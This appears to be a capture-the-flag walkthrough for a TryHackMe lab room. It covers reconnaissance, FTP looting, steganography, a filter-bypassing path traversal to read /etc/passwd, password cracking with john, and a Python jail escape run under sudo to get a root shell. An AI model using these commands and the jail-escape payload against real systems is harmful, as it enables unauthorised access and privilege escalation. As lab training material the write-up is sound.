# Tokyo Ghoul

**Room Link:** [https://tryhackme.com/room/tokyoghoul666](https://tryhackme.com/room/tokyoghoul666)

## Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (585).png" alt=""><figcaption></figcaption></figure>



## Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (586).png" alt=""><figcaption></figcaption></figure>



## TCP/80 - HTTP

**Kali**

```
gobuster dir -u $VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (590).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (591).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (592).png" alt=""><figcaption></figcaption></figure>





## TCP/21 - FTP

**Kali**

```
ftp $VICTIM
Username: ftp
cd need_Help?
mget Aogiri_tree.txt
cd Talk_with_me
mget *
```

<figure><img src="../../.gitbook/assets/image (587).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (588).png" alt=""><figcaption></figcaption></figure>

## Ghidra

**Kali**

```
ghidra
```

<figure><img src="../../.gitbook/assets/image (593).png" alt=""><figcaption></figcaption></figure>



**Kali**

```
./need_to_talk 
> kamishiro
```

<figure><img src="../../.gitbook/assets/image (594).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
steghide extract -sf rize_and_kaneki.jpg 
Password: You_found_1t

cat yougotme.txt
```

<figure><img src="../../.gitbook/assets/image (595).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (596).png" alt=""><figcaption></figcaption></figure>

CyberChef was able to idenfify it was morse code and from there it was obvious the next few steps.

Morse code -> Hex -> Base64

<figure><img src="../../.gitbook/assets/image (597).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (598).png" alt=""><figcaption></figcaption></figure>



## TCP/80 - HTTP

**Kali**

```
gobuster dir -u $VICTIM/d1r3c70ry_center/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (600).png" alt=""><figcaption></figcaption></figure>







<figure><img src="../../.gitbook/assets/image (599).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (601).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (602).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (603).png" alt=""><figcaption></figcaption></figure>

There was a filter so to bypass I url encoded the most of path to passwd

<figure><img src="../../.gitbook/assets/image (604).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (605).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
john --wordlist=/usr/share/wordlists/rockyou.txt passwd 
```

<figure><img src="../../.gitbook/assets/image (606).png" alt=""><figcaption></figcaption></figure>

## TCP/22 - SSH

**Kali**

```
ssh kamishiro@$VICTIM
Password: password123
```



**Victim**

```
sudo -l
```

<figure><img src="../../.gitbook/assets/image (607).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
cat  /home/kamishiro/jail.py
sudo /usr/bin/python3 /home/kamishiro/jail.py
>>>  __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('/bin/bash')
```



<figure><img src="../../.gitbook/assets/image (609).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (608).png" alt=""><figcaption></figcaption></figure>

